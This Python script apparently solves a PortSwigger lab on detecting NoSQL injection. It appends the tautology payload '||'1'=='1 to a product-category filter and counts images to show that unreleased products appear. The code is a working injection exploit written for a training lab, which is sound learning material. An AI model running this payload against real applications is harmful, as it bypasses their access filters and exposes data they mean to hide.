#!/usr/bin/env python3
"""
Detecting NoSQL injection
PortSwigger Web Security Academy -- NoSQL Injection

Companion script for the writeup: 01-detecting-nosql-injection.md

What this does:
    Pulls a valid category name from the storefront's own homepage, requests it
    unmodified as a baseline, then requests it again with an always-true tautology
    appended (category'||'1'=='1). Against a query shaped like
    this.category == 'Accessories' && this.released == 1, the tautology turns the
    released check into an unconditional true, so the injected request returns
    every product -- including the ones the released filter was hiding. We measure
    the effect by counting <img> tags in each response rather than reading the page.

Usage:
    python 01-detecting-nosql-injection.py <lab-url>
    e.g. python 01-detecting-nosql-injection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    r = client.get(lab_url)
    cats = re.findall(r'category=([^"&]+)', r.text)
    valid_cat = cats[0] if cats else "Accessories"
    print(f"[*] Using category: {valid_cat}")

    r_base = client.get(f"{lab_url}/filter?category={valid_cat}")
    base_imgs = len(re.findall(r"<img", r_base.text))
    print(f"[*] Baseline: {base_imgs} images")

    inject_url = f"{lab_url}/filter?category={valid_cat}'||'1'=='1"
    r_inject = client.get(inject_url)
    inject_imgs = len(re.findall(r"<img", r_inject.text))
    print(f"[*] Injected: {inject_imgs} images")

    if inject_imgs > base_imgs:
        print(f"[+] Unreleased products visible ({inject_imgs - base_imgs} extra)")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- released filter bypassed via always-true tautology.")
    else:
        print("[-] Not solved yet -- inspect the injected response for unreleased products.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
